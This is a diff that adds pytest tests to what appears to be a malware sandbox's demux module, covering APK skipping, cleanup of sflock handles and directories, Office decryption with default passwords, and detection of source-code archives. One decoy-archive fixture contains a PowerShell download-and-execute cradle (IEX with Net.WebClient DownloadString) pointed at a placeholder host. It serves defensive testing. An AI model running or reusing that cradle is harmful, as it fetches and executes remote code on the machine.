@@ -329,3 +329,240 @@ class TestDemux:
         assert demuxed == [(str(sample).encode(), "windows")]
         assert errors == []
 
+    def test_demux_sflock_skips_apk_before_unpack(self, tmp_path, monkeypatch):
+        import zipfile
+
+        apk_blob = tmp_path / "extensionless_apk"
+        with zipfile.ZipFile(apk_blob, "w") as zf:
+            zf.writestr("AndroidManifest.xml", b"<manifest/>")
+            zf.writestr("classes.dex", b"dex\n035\x00")
+            zf.writestr("res/layout.xml", b"<LinearLayout/>")
+
+        normal_zip = tmp_path / "archive.zip"
+        with zipfile.ZipFile(normal_zip, "w") as zf:
+            zf.writestr("payload.exe", b"MZ\x90\x00")
+
+        assert demux._is_apk_archive(str(apk_blob).encode()) is True
+        assert demux._is_apk_archive(b"/nonexistent/app.apk") is True
+        assert demux._is_apk_archive(str(normal_zip).encode()) is False
+
+        unpack_calls = []
+        monkeypatch.setattr(demux, "HAS_SFLOCK", True)
+        monkeypatch.setattr(demux, "unpack", lambda *a, **kw: unpack_calls.append(a), raising=False)
+
+        ret, err, opts = demux.demux_sflock(str(apk_blob).encode(), options="")
+        assert ret == []
+        assert err == "blacklisted package"
+        assert opts == []
+        assert unpack_calls == []
+
+        monkeypatch.setattr(demux.File, "get_type", lambda self: "Zip archive data, at least v2.0 to extract")
+        demuxed, errors = demux.demux_sample(str(apk_blob).encode(), package="", options="", use_sflock=True)
+        assert demuxed == [(str(apk_blob).encode(), "")]
+        assert errors == [{"extensionless_apk": "blacklisted package"}]
+        assert unpack_calls == []
+
+    def test_demux_sflock_closes_unpacked_and_cleans_discarded_children(self, tmp_path, monkeypatch):
+        monkeypatch.setattr(demux, "tmp_path", str(tmp_path))
+        monkeypatch.setattr(demux, "HAS_SFLOCK", True)
+
+        # 1. _sf_children does not create empty cuckoo-sflock/tmp* dirs on empty contents
+        empty_child = SimpleNamespace(
+            filename=b"empty.exe",
+            contents=b"",
+            platform="windows",
+            magic="PE32 executable",
+            filesize=0,
+            package="exe",
+        )
+        extracted_path, _, _, _ = demux._sf_children(empty_child)
+        assert extracted_path == b""
+        assert not (tmp_path / "cuckoo-sflock").exists()
+
+        # 2. demux_sflock calls unpacked.close() deterministically
+        archive_file = tmp_path / "bundle.7z"
+        archive_file.write_bytes(b"7z\xbc\xaf\x27\x1c\x00\x04")
+        closed = []
+
+        fake_unpacked = SimpleNamespace(
+            package="7z",
+            filepaths=[b"one.exe", b"two.exe"],
+            children=[],
+            close=lambda: closed.append(True),
+        )
+        monkeypatch.setattr(demux, "unpack", lambda *a, **kw: fake_unpacked, raising=False)
+        ret, err, opts = demux.demux_sflock(str(archive_file).encode(), options="")
+        assert ret == []
+        assert err == ""
+        assert opts == ["file=one.exe", "file=two.exe"]
+        assert closed == [True]
+
+        # Legacy sflock fallback closes _stream across tree when .close is absent
+        legacy_stream = SimpleNamespace(closed=False)
+        legacy_stream.close = lambda: setattr(legacy_stream, "closed", True)
+        legacy_child_stream = SimpleNamespace(closed=False)
+        legacy_child_stream.close = lambda: setattr(legacy_child_stream, "closed", True)
+        legacy_root = SimpleNamespace(
+            _stream=legacy_stream,
+            children=[SimpleNamespace(_stream=legacy_child_stream, children=[])],
+        )
+        demux._close_sflock_file(legacy_root)
+        assert legacy_stream.closed is True
+        assert legacy_child_stream.closed is True
+
+        # 3. Overflow children past demux_files_limit are cleaned from cuckoo-sflock
+        monkeypatch.setattr(demux, "demux_files_limit", 1)
+        monkeypatch.setattr(demux.File, "get_type", lambda self: "7-zip archive data")
+
+        def _fake_demux_sflock(_fn, _opts, _chk):
+            out = []
+            for idx in range(3):
+                c = SimpleNamespace(
+                    filename=f"item_{idx}.exe".encode(),
+                    contents=b"MZ" + bytes([idx]),
+                    platform="windows",
+                    magic="PE32 executable",
+                    filesize=3,
+                    package="exe",
+                )
+                out.append(demux._sf_children(c))
+            return out, "", []
+
+        monkeypatch.setattr(demux, "demux_sflock", _fake_demux_sflock)
+        demuxed, errors = demux.demux_sample(str(archive_file).encode(), package="", options="", use_sflock=True)
+        assert len(demuxed) == 1
+        assert errors == []
+        sflock_dir = tmp_path / "cuckoo-sflock"
+        remaining_dirs = list(sflock_dir.iterdir())
+        assert len(remaining_dirs) == 1
+        assert os.path.exists(demuxed[0][0])
+
+    def test_demux_office_closes_sflock_handles(self, tmp_path, monkeypatch):
+        sample = tmp_path / "locked.doc"
+        sample.write_bytes(b"encrypted-office")
+        closed_objs = []
+
+        def _make_sf(tag):
+            obj = SimpleNamespace(tag=tag)
+            obj.close = lambda: closed_objs.append(tag)
+            return obj
+
+        class FakeOffice:
+            def __init__(self, sf_obj):
+                self.sf_obj = sf_obj
+
+            def decrypt(self, pw):
+                dec = _make_sf(f"dec:{pw}")
+                if pw == "infected":
+                    dec.contents = b"decrypted-doc"
+                    dec.magic = "Composite Document File"
+                else:
+                    dec.contents = b""
+                    dec.magic = "CDFV2 Encrypted"
+                return dec
+
+        monkeypatch.setattr(demux, "tmp_path", str(tmp_path))
+        monkeypatch.setattr(demux, "HAS_MSOFFCRYPTO", False)
+        monkeypatch.setattr(demux, "HAS_SFLOCK", True)
+        monkeypatch.setattr(demux, "OfficeFile", FakeOffice, raising=False)
+        monkeypatch.setattr(demux, "sfFile", SimpleNamespace(from_path=lambda _p: _make_sf("src")), raising=False)
+
+        res = demux.demux_office(str(sample).encode(), "", "windows")
+        assert len(res) == 1
+        assert closed_objs == ["dec:VelvetSweatshop", "src", "dec:infected", "src"]
+
+    def test_demux_source_code_archive_not_split_and_malware_preserved(self, tmp_path, monkeypatch):
+        import io
+        import tarfile
+        import zipfile
+
+        unpack_calls = []
+        monkeypatch.setattr(demux, "HAS_SFLOCK", True)
+        monkeypatch.setattr(demux, "unpack", lambda *a, **kw: unpack_calls.append(a), raising=False)
+        monkeypatch.setattr(demux.File, "get_type", lambda self: "Zip archive data")
+
+        # 1. Go module zip (extensionless filename) is detected pre-unpack and kept as 1 unsplit sample
+        gomod_zip = tmp_path / "sample_gomod_blob"
+        with zipfile.ZipFile(gomod_zip, "w") as zf:
+            zf.writestr("example.com/org/pkg@v0.4.0/go.mod", b"module example.com/org/pkg\n")
+            zf.writestr("example.com/org/pkg@v0.4.0/internal/render/theme_test.go", b"package render\n")
+            zf.writestr("example.com/org/pkg@v0.4.0/docs/index.html", b"<html></html>")
+            zf.writestr("example.com/org/pkg@v0.4.0/scripts/release.sh", b"#!/bin/sh\necho ok\n")
+
+        demuxed, errors = demux.demux_sample(
+            str(gomod_zip).encode(), package="", options="", use_sflock=True, platform="windows"
+        )
+        assert demuxed == [(str(gomod_zip).encode(), "windows")]
+        assert errors == []
+        assert unpack_calls == []
+
+        # 2. Compressed tarball (.tar.gz) of Python/JS repo is NOT split into setup.py / build.sh / index.js tasks
+        repo_tgz = tmp_path / "repo-1.0.0.tar.gz"
+        with tarfile.open(repo_tgz, "w:gz") as tf:
+            for name, body in (
+                ("repo-1.0.0/pyproject.toml", b"[project]\nname='demo'\n"),
+                ("repo-1.0.0/src/demo/__init__.py", b"__version__ = '1.0.0'\n"),
+                ("repo-1.0.0/scripts/build.sh", b"#!/bin/sh\necho build\n"),
+                ("repo-1.0.0/web/app.js", b"console.log('ui');\n"),
+            ):
+                ti = tarfile.TarInfo(name=name)
+                ti.size = len(body)
+                tf.addfile(ti, io.BytesIO(body))
+
+        monkeypatch.setattr(demux.File, "get_type", lambda self: "gzip compressed data")
+        demuxed_tgz, errors_tgz = demux.demux_sample(str(repo_tgz).encode(), package="", options="", use_sflock=True)
+        assert demuxed_tgz == [(str(repo_tgz).encode(), "")]
+        assert errors_tgz == []
+        assert unpack_calls == []
+
+        # 3. Post-unpack fallback (e.g. .7z source repo) also avoids splitting and closes unpacked handle
+        repo_7z = tmp_path / "source.7z"
+        repo_7z.write_bytes(b"7z\xbc\xaf\x27\x1c\x00\x04")
+        closed_7z = []
+        fake_7z_unpacked = SimpleNamespace(
+            package="7z",
+            filepaths=[b"proj/Cargo.toml", b"proj/src/main.rs", b"proj/scripts/ci.sh", b"proj/docs/index.html"],
+            children=[],
+            close=lambda: closed_7z.append(True),
+        )
+        monkeypatch.setattr(demux, "unpack", lambda *a, **kw: unpack_calls.append(a) or fake_7z_unpacked, raising=False)
+        monkeypatch.setattr(demux.File, "get_type", lambda self: "7-zip archive data")
+        demuxed_7z, errors_7z = demux.demux_sample(str(repo_7z).encode(), package="", options="", use_sflock=True)
+        assert demuxed_7z == [(str(repo_7z).encode(), "")]
+        assert errors_7z == []
+        assert len(unpack_calls) == 1
+        assert closed_7z == [True]
+
+        # 4. Malware delivery archives (phishing .js zip, decoy .gitignore + .exe/.lnk) MUST NOT match source code
+        phish_js_zip = tmp_path / "invoice.zip"
+        with zipfile.ZipFile(phish_js_zip, "w") as zf:
+            zf.writestr("Invoice_0912.js", b"WScript.Echo(1);")
+        assert demux._is_source_code_archive(str(phish_js_zip).encode()) is False
+
+        decoy_exe_zip = tmp_path / "decoy.zip"
+        with zipfile.ZipFile(decoy_exe_zip, "w") as zf:
+            zf.writestr(".gitignore", b"*.log\n")
+            zf.writestr("setup.exe", b"MZ\x90\x00")
+            zf.writestr("vcruntime140.dll", b"MZ\x90\x00")
+        assert demux._is_source_code_archive(str(decoy_exe_zip).encode()) is False
+
+        decoy_ps1_zip = tmp_path / "decoy_ps1.zip"
+        with zipfile.ZipFile(decoy_ps1_zip, "w") as zf:
+            zf.writestr("Makefile", b"all:\n\techo hi\n")
+            zf.writestr("main.py", b"print(1)\n")
+            zf.writestr("stage2.ps1", b"IEX (New-Object Net.WebClient).DownloadString('http://example.com')")
+        assert demux._is_source_code_archive(str(decoy_ps1_zip).encode()) is False
+
+        # 5. ignore_junk_filter=1 bypasses source-code archive skip when explicitly requested
+        unpack_calls.clear()
+        monkeypatch.setattr(
+            demux,
+            "unpack",
+            lambda *a, **kw: unpack_calls.append(a) or SimpleNamespace(package="zip", filepaths=[], children=[], close=lambda: None),
+            raising=False,
+        )
+        demux.demux_sflock(str(gomod_zip).encode(), options="ignore_junk_filter=1")
+        assert len(unpack_calls) == 1
+
+
+
